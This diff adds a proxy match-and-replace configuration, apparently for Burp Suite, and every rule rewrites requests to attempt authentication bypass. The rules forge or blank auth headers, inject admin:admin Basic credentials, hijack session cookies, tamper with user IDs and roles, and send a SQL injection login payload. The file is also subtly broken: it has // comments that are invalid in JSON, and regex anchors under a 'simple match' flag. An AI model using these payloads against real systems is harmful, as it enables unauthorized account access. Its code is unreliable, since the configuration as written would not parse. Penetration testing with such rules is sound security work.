@@ -1,0 +1,102 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "Authentication Bypass - Modify Authorization Token (JWT Bypass)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Authorization: Bearer .*",
+                "string_replace": "Authorization: Bearer fake-jwt-token"
+            },
+            {
+                "comment": "Authentication Bypass - Modify Basic Auth header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Authorization: Basic .*",
+                "string_replace": "Authorization: Basic YWRtaW46YWRtaW4="  // admin:admin base64 encoded
+            },
+            {
+                "comment": "Authentication Bypass - Modify Session Cookie to Hijack Session",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_cookie",
+                "string_match": "^session=.*$",
+                "string_replace": "session=fake-session-id"
+            },
+            {
+                "comment": "Authentication Bypass - Send Empty Authorization Header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Authorization:.*$",
+                "string_replace": "Authorization:"
+            },
+            {
+                "comment": "Authentication Bypass - Modify User ID in the request (IDOR)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "^user_id=.*$",
+                "string_replace": "user_id=9999"  // assuming 9999 is an admin or another user's ID
+            },
+            {
+                "comment": "Authentication Bypass - Modify Username and Password to Known Default Credentials",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "username=.*$",
+                "string_replace": "username=admin&password=admin"
+            },
+            {
+                "comment": "Authentication Bypass - Test with Invalid Token (JWT)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Authorization: Bearer .*",
+                "string_replace": "Authorization: Bearer invalid-token"
+            },
+            {
+                "comment": "Authentication Bypass - Change User Role in Request (Role Escalation)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "^role=.*$",
+                "string_replace": "role=admin"
+            },
+            {
+                "comment": "Authentication Bypass - Modify Login Payload (for bypassing login validation)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "username=.*$",
+                "string_replace": "username=admin&password=admin"
+            },
+            {
+                "comment": "Authentication Bypass - Inject Custom Header for Access Control Bypass",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^X-Access-Token:.*$",
+                "string_replace": "X-Access-Token: bypass-token"
+            },
+            {
+                "comment": "Authentication Bypass - Attempt Login with Empty Credentials",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "username=.*$",
+                "string_replace": "username=&password="
+            },
+            {
+                "comment": "Authentication Bypass - Attempt SQL Injection in Username Field",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "username=.*$",
+                "string_replace": "username=admin' OR '1'='1&password=password"
+            }
+        ]
+    }
+}
